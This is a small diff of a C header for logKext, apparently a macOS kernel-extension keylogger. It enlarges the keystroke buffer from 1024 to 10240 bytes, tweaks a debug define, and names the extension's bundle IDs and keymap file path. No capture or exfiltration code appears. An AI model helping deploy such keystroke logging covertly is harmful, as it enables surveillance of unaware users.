@@ -17,7 +17,7 @@
    limitations under the License.
 */
 
-#define MAX_BUFF_SIZE 1024
+#define MAX_BUFF_SIZE 10240
 
 typedef struct {
 	unsigned char buffer[MAX_BUFF_SIZE];
@@ -33,4 +33,4 @@ enum {
 #define PREF_DOMAIN		 	 CFSTR("com.fsb.logKext")
 #define KEXT_ID				"com.fsb.kext.logKext"
 #define KEYMAP_PATH			"/Library/Application Support/logKext/logKextKeymap.plist"
-//#define DEBUG
+// #define DEBUG 0
